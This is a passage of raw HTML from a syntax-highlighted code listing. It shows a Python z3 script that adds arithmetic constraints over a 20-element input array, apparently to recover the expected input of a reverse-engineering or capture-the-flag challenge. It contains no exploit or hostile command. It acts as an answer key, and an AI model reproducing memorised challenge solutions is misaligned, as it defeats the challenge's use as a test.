class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">8904587</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1227620874</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1836606059</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">8720560</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">11387045</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre><span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre><span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">7660269</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>      <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>      <span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2461883</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>    <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>    <span 